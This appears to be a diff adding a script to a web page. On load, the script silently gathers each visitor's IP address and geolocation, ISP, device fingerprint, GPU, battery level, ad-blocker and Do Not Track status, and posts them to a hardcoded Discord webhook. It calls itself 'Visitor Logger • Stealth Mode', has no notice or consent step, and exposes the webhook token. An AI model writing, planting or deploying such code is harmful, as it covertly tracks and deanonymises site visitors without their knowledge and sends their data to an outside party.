@@ -1,0 +1,185 @@
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1480341215663886376/Ay4mu0JQhvPFTA1BZSqRwytTa_FvTZVGug6kazsxppxbrDRoGOi8BQkyv7APau8Rug1h";
+
+  function getDeviceType() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (/tablet|ipad|playbook|silk/i.test(ua)) return "Tablet";
+    if (/mobile|android|iphone|ipod/i.test(ua)) return "Mobile";
+    return "Desktop";
+  }
+
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Edg")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+
+  function getBrowserEngine() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Gecko/") && !ua.includes("like Gecko")) return "Gecko";
+    if (ua.includes("AppleWebKit")) return "WebKit";
+    if (ua.includes("Blink")) return "Blink";
+    return "Unknown";
+  }
+
+  function getGPUInfo() {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      return {
+        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable",
+        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unavailable"
+      };
+    } catch {
+      return { renderer: "Unavailable", vendor: "Unavailable" };
+    }
+  }
+
+  function getConnectionInfo() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return conn
+      ? `Type: ${conn.effectiveType}, Downlink: ${conn.downlink}Mbps`
+      : "Unavailable";
+  }
+
+  function getFingerprint() {
+    const raw = [
+      navigator.userAgent,
+      navigator.language,
+      screen.width,
+      screen.height,
+      navigator.platform,
+      navigator.hardwareConcurrency,
+      navigator.deviceMemory
+    ].join("|");
+    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw)).then(buf =>
+      [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2, "0")).join("")
+    );
+  }
+
+  function detectAdBlock(callback) {
+    const ad = document.createElement("div");
+    ad.className = "adsbox";
+    ad.style.display = "none";
+    document.body.appendChild(ad);
+    setTimeout(() => {
+      const blocked = ad.offsetHeight === 0;
+      document.body.removeChild(ad);
+      callback(blocked ? "Yes" : "No");
+    }, 100);
+  }
+
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(async data => {
+      const {
+        ip, city, region, country_name: country,
+        org: isp, timezone
+      } = data;
+
+      const browser = getBrowser();
+      const engine = getBrowserEngine();
+      const userAgent = navigator.userAgent;
+      const deviceType = getDeviceType();
+      const screenSize = `${screen.width}x${screen.height}`;
+      const windowSize = `${window.innerWidth}x${window.innerHeight}`;
+      const orientation = screen.orientation?.type || "Unavailable";
+      const colorDepth = screen.colorDepth;
+      const gpu = getGPUInfo();
+      const connection = getConnectionInfo();
+      const fingerprint = await getFingerprint();
+      const language = navigator.language;
+      const platform = navigator.platform;
+      const concurrency = navigator.hardwareConcurrency || "Unknown";
+      const memory = navigator.deviceMemory || "Unknown";
+      const batteryLevel = await (navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}%`).catch(() => "Unavailable") || "Unknown");
+      const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
+      const cookies = navigator.cookieEnabled ? "Yes" : "No";
+      const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
+      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
+      const java = navigator.javaEnabled() ? "Yes" : "No";
+      const online = navigator.onLine ? "Online" : "Offline";
+      const fontCount = document.fonts ? document.fonts.size : "Unavailable";
+      const pageTitle = document.title;
+      const time = new Date().toString();
+
+      detectAdBlock(adBlocked => {
+        const payload = {
+          username: "📡 Visitor Logger",
+          avatar_url: "https://i.imgur.com/2xVfCiq.png",
+          embeds: [{
+            title: "🔍 Visitor Intel Report",
+            color: 0x00b0f4,
+            description: `**IP Address:** \`${ip}\``,
+            fields: [
+              {
+                name: "📍 Location",
+                value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}`,
+                inline: true
+              },
+              {
+                name: "🌐 Network",
+                value: `**ISP:** ${isp || "Unknown"}\n**Timezone:** ${timezone}\n**Connection:** ${connection}`,
+                inline: true
+              },
+              {
+                name: "🧠 System",
+                value: `**Type:** ${deviceType}\n**Platform:** ${platform}\n**CPU Threads:** ${concurrency}\n**RAM:** ${memory} GB`,
+                inline: true
+              },
+              {
+                name: "🖥️ Display & GPU",
+                value: `**Resolution:** ${screenSize} @ ${colorDepth}bit\n**Window:** ${windowSize}\n**Touch:** ${touchSupport}\n**Orientation:** ${orientation}`,
+                inline: true
+              },
+              {
+                name: "🎮 GPU Details",
+                value: `**Renderer:** ${gpu.renderer}\n**Vendor:** ${gpu.vendor}`,
+                inline: true
+              },
+              {
+                name: "🧩 Browser",
+                value: `**Browser:** ${browser}\n**Engine:** ${engine}\n**Lang:** ${language}\n**Cookies:** ${cookies}\n**Java:** ${java}\n**DNT:** ${dnt}`,
+                inline: true
+              },
+              {
+                name: "🌙 Preferences",
+                value: `**Theme:** ${prefersDark}\n**Battery:** ${batteryLevel}\n**AdBlock:** ${adBlocked}\n**Fonts Loaded:** ${fontCount}`,
+                inline: true
+              },
+              {
+                name: "🧬 Fingerprint",
+                value: `\`${fingerprint.slice(0, 40)}...\` _(SHA-256 hash)_`,
+                inline: false
+              },
+              {
+                name: "📄 Page Title",
+                value: pageTitle || "Unknown",
+                inline: false
+              },
+              {
+                name: "🕒 Time of Visit",
+                value: time,
+                inline: false
+              }
+            ],
+            footer: {
+              text: "Visitor Logger • Stealth Mode",
+              icon_url: "https://i.imgur.com/vyFjK0z.png"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      });
+    });
+</script>
